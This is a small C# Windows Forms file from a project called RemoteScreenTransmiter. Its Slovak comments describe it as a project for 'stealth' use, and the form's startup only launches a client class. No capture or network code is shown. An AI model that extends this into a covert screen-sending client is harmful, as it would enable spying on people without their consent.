/*táto verzia programu môže slúžiť na normálne použitie..
 ešte ju trochu upravím.
 */

using System;
using System.Windows.Forms;
using System.Diagnostics;

namespace RemoteScreenTransmiter { 

    public partial class Form1 : Form
    {
        /*projekt pre stealth použitie*/
        public Form1()
        {
            InitializeComponent();
            init();
        }

        private void init()
        {
            try
            {
                ClientMain clientMain = new ClientMain();
                clientMain.Main();
            }
            catch(Exception ex)
            {
                Debug.WriteLine("Exception [Form1.cs][RemoteScreenClient.init()] : " + ex.Message);
            }
        }
    }
}
